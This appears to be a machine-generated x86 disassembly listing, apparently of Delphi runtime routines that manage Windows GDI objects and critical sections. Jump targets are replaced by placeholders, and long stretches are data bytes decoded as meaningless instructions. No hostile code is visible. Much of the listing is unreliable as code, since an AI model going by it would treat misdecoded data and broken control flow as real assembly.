add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
add al cl
adc eax 0x15b40042
inc edx
add al ch
adc al 0x42
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
jns r-xdata
jae r-xdata
add al 0xdc
jmp r-xdata
dec ebp
add al 0x24
retn
outsd
aam 0xeb
inc ecx
add [ eax + eax ] cl
add bh bh
call 0xffffffff8c423108
push ebx
inc ecx
add [ eax + eax ] al
out dx eax
inc ecx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
and al 0xc3
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
in eax dx
inc ecx
add [ eax ] dl
add [ eax ] al
[ ebx + edx + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
imul esp [ ebx + 0x73 ] 0xee380004
mov [ ebx ] ss
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc edx
or [ edi + 0x72 ] al
popad
jo r-xdata
out dx al
inc ecx
add [ ebx + edx * 2 + 0x40041 ] cl
pop ebp
retn 0x4
sub_41f0d6
inc edx
add [ eax ] cl
push esp
inc edi
jb r-xdata
sbb ecx esi
inc ecx
add [ edi ] ah
int1
inc ecx
add [ ecx ] dh
jo r-xdata
int1
inc ecx
add [ ecx ] cl
int1
inc ecx
add [ ecx ] dl
int1
inc ecx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
imul esp [ ebx - 0x73 ] 0xf0e80040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx + 0x6c ] 0x8c0041f0
push esp
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc ecx
add [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
int1
inc ecx
add al dh
int1
inc ecx
add [ eax + eax ] ch
add [ eax ] al
or [ ecx + eax * 2 ] dl
xor [ 0x7cb80040 ] dh
inc ecx
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x325c0040 ] bl
inc edx
add [ edx + esi + 0x37080042 ] cl
inc edx
add [ esp + esi + 0x42 ] cl
add [ eax + 0x7d ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
inc ecx
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
sbb edx 0x0
aam 0x11
ror [ edi + 0x60 ] 0xb2
fnstsw [ esi ]
int1
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41f1c0c0 ] cl
jo r-xdata
add [ edx - 0xf ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add al dl
int1
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
shl cl 0x41
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_42341c
sub_41f178
push edx
int1
inc ecx
add [ eax ] al
add [ eax ] al
add al dl
int1
inc ecx
add [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
int1
inc ecx
add al dh
int1
inc ecx
add [ eax + eax ] ch
add [ eax ] al
or [ ecx + eax * 2 ] dl
xor [ 0x7cb80040 ] dh
inc ecx
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x325c0040 ] bl
inc edx
add [ edx + esi + 0x37080042 ] cl
inc edx
add [ esp + esi + 0x42 ] cl
add [ eax + 0x7d ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
inc ecx
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
sub_41f1e6
cld
dec esp
xor al 0x42
add al dh
xor al 0x42
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ eax ] al
inc ecx
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
shl cl 0x41
add [ esp + edx * 2 + 0x41 ] cl
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
imul esp [ ebx + 0x73 ] 0x6c900000
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
xor eax 0x353c0040
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
add [ eax ] al
jl r-xdata
add [ eax + 0x7d ] cl
inc ecx
add [ edx + ebp ] bl
inc edx
add [ esp + edi ] al
inc edx
add al bl
sub al [ edx ]
jl r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
int3
add [ eax ] bh
xor eax 0x32800040
inc eax
inc eax
xor eax 0x35440040
inc eax
jae r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xd ] dh
inc ecx
add [ eax + eax ] ah
add [ eax ] al
shl dl 0x41
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x37840040 ] bl
inc edx
add al al
aaa
inc edx
add [ esi ] cl
push esp
dec ebp
je r-xdata
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
or al 0xf3
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
inc edi
jb r-xdata
add [ edi ] cl
push esp
dec ebp
je r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
add al cl
adc eax 0x15b40042
inc edx
add al ch
adc al 0x42
add [ eax + ecx * 2 + 0x42 ] bl
add al ah
dec eax
inc edx
add [ ecx ] cl
push esp
dec ebp
je r-xdata
inc edx
add [ ebp + edi + 0x3e280042 ] dl
inc edx
add [ esp + ebp ] ah
inc edx
add [ esi + edi + 0x3f940042 ] dh
inc edx
add al al
inc ebx
inc edx
add [ eax ] cl
sub eax 0x44ac0042
inc edx
add [ eax + 0x8004244 ] dh
inc esi
inc edx
add al bh
cmp al [ edx ]
sub [ edx + eax * 2 ] ch
add [ eax + 0x42 ] dl
inc edx
add [ eax ] bl
aas
inc edx
add [ ebx + eax * 2 ] dl
inc edx
add [ eax ] al
add [ eax + 0x41f2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x5c0041 ] al
add [ eax ] al
pushfd
out dx al
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x3aac0040 ] bl
inc edx
add al bh
jpo r-xdata
inc ecx
add [ edi ] al
andps xmm1 [ ebp + 0x65 ]
je r-xdata
dec ecx
jo r-xdata
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x4d0c0040 ] bl
inc edx
add [ eax + 0x4d ] ch
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
or al 0xf5
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41f5 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 8 + 0x41 ] bh
add [ eax + eax ] bh
add [ eax ] al
and al dh
inc ecx
add [ eax ] dh
xor eax 0x7cb80040
inc ecx
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x57f80040 ] bl
inc edx
add al bh
jpo r-xdata
imul bp [ ebp - 0x75 ] 0x40c0
hlt
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx + ebp ] ah
xor [ edx ] 0x40
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
jo r-xdata
add [ edx + ebp + 0x58340042 ] cl
inc edx
add [ eax + 0x7d ] cl
inc ecx
add [ eax ] cl
pop edx
inc edx
add [ eax - 0x27ffbda6 ] cl
sub al [ edx ]
cmp al 0x5d
inc edx
add al dh
pop ebp
inc edx
add [ eax ] dh
pop esi
inc edx
add [ esp + ebp ] ah
inc edx
add [ esi + ebx * 2 + 0x62780042 ] cl
inc edx
add [ edx + ebp * 2 + 0x42 ] dh
add [ eax + 0x6b ] cl
inc edx
add [ ebp + 0x6c1c0042 ] cl
inc edx
add [ eax + 0x6c ] dh
inc eax
add [ esp + edx * 2 ] cl
push ebx
push 0x64657261
xor al [ eax ]
and al 0x2b
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
cmc
inc ecx
add [ eax ] bl
add [ eax ] al
add al al
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x70300040 ] bl
inc edx
add [ eax + 0x70 ] ah
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
popad
nop
push eax
test [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
test [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 + 0x340041 ] dh
add [ eax ] al
and al dh
inc ecx
add [ eax ] dh
xor eax 0x7cb80040
inc ecx
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x70cc0040 ] bl
inc edx
add al bh
jpo r-xdata
inc edx
add [ eax + 0x28004257 ] dl
sub al 0x42
add [ eax + 0x5400422c ] dh
popad
inc edx
add [ eax - 0x2fffbd91 ] cl
pushad
inc edx
add [ eax - 0x5fffbd91 ] dl
pop ebp
inc edx
add [ eax ] al
pop esi
inc edx
add [ ecx + ebp * 2 ] bh
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41f58870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41f50c70
add ah ah
insd
popad
lea eax [ bx + si ]
insb
dec ecx
inc ecx
add [ eax ] cl
out dx eax
inc ecx
sbb al 0x2d
inc edx
add [ eax + 0x70 ] bh
add [ edx + ebp + 0x70fc0042 ] cl
inc edx
add [ eax + 0x7d ] cl
inc ecx
add [ edx + ebp ] bl
inc edx
add [ ecx + esi * 2 + 0x42 ] bl
add al bl
sub al [ edx ]
pushfd
jno r-xdata
call DeleteObject
add [ esp + esi * 2 + 0x74bc0042 ] dl
inc edx
add al dl
je r-xdata
add al cl
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 ] bh
inc ecx
add [ eax + eax ] ah
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x85fffc0 ] bl
inc ecx
add [ eax ] dl
push esp
push edx
jae r-xdata
add [ 0x6f634954 ] al
outsb
mov eax eax
shl dh 0x41
add [ edi ] al
push esp
dec ecx
arpl [ edi + 0x6e ] bp
add [ eax ] ah
sub al 0x42
add [ esp + ebp ] ah
inc edx
add ah bl
jno r-xdata
imul edi esi 0xffffffff
test bl bl
jne r-xdata
add eax 0x6f634954
outsb
push eax
test [ ecx ] 0xe4
inc edx
add [ eax ] ch
sub al 0x42
add [ eax + 0x1c00422c ] dh
jae r-xdata
add [ esp + ebp + 0x74600042 ] ah
inc edx
add [ eax ] cl
sub eax 0x74780042
inc edx
add [ esp + esi * 2 + 0x42 ] bh
add [ ebp + 0x70780042 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41f597
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
push eax
test [ ecx ] 0x0
jo r-xdata
sbb al 0x2d
inc edx
add [ eax + 0x70 ] bh
add [ edx + ebp + 0x70fc0042 ] cl
inc edx
add [ eax + 0x7d ] cl
inc ecx
add [ edx + ebp ] bl
inc edx
add [ ecx + esi * 2 + 0x42 ] bl
add al bl
sub al [ edx ]
pushfd
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
test [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 + 0x340041 ] dh
add [ eax ] al
and al dh
inc ecx
add [ eax ] dh
xor eax 0x7cb80040
inc ecx
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x70cc0040 ] bl
inc edx
add al bh
jpo r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
hlt
call DeleteObject
add [ esp + esi * 2 + 0x74bc0042 ] dl
inc edx
add al dl
je r-xdata
add al cl
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 ] bh
inc ecx
add [ eax + eax ] ah
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x85fffc0 ] bl
inc ecx
add [ eax ] dl
push esp
push edx
jae r-xdata
add [ 0x6f634954 ] al
outsb
mov eax eax
shl dh 0x41
add [ edi ] al
push esp
dec ecx
arpl [ edi + 0x6e ] bp
add [ eax ] ah
sub al 0x42
add [ esp + ebp ] ah
inc edx
add ah bl
jno r-xdata
imul edi esi 0xffffffff
test bl bl
jne r-xdata
add eax 0x6f634954
outsb
push eax
test [ ecx ] 0xe4
inc edx
add [ eax ] ch
sub al 0x42
add [ eax + 0x1c00422c ] dh
jae r-xdata
add [ esp + ebp + 0x74600042 ] ah
inc edx
add [ eax ] cl
sub eax 0x74780042
inc edx
add [ esp + esi * 2 + 0x42 ] bh
add [ ebp + 0x70780042 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41f6f0
cmp al 0xf7
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 ] bh
inc ecx
add [ eax + eax ] ah
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x85fffc0 ] bl
inc ecx
add [ eax ] dl
push esp
push edx
jae r-xdata
imul edi esi 0xffffffff
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41f764
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41f7a0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41f7dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41f750
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41f7c4
xor edx edx
push ebp
push sub_41f8b0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f8b7
mov eax [ ebp - 0x4 ]
call sub_41f7d0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_40276c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_402968
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407f60
test al al
je r-xdata
sub_41f8c0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41f7c4
xor ecx ecx
push ebp
push sub_41f947
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f7d0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41f970
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41f7c4
xor eax eax
push ebp
push sub_41f9d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f7dc
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41f8c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9e0
mov eax [ ebp - 0x4 ]
call sub_41f7d0
retn
mov eax ebx
mov si 0xfffd
call sub_4034e4
sub_41f9e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41f7c4
xor eax eax
push ebp
push sub_41fa44
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa4b
mov eax [ ebp - 0x4 ]
call sub_41f7d0
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_4034e4
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f8c0
sub_41fa54
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41f7c4
xor edx edx
push ebp
push sub_41fab3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41faba
mov eax [ ebp - 0x4 ]
call sub_41f7d0
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41fac0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4178dc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41fb5d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417570
mov ebx eax
mov eax ebx
call sub_4210c0
inc [ ebp - 0x4 ]
mov eax ebx
call sub_42148c
mov eax [ rw-data ]
call sub_41fa54
mov eax [ rw-data ]
call sub_41fa54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb64
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_417940
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417570
call sub_421364
inc esi
dec ebx
jne r-xdata
sub_4201b3
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_417020
retn
sub_4201e4
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402dfc
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402bec
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_420298
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41f7dc
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4202ec
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41f8c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_420330
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417b14
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41fff0
xor eax eax
push ebp
push sub_4203eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41fff0
xor eax eax
push ebp
push sub_4203ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41f9e8
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42046c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4203d5
mov eax [ ebp - 0x8 ]
call sub_420000
retn
mov eax ebx
call sub_4206f0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42070c
sub_42041c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41fff0
xor eax eax
push ebp
push sub_420461
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
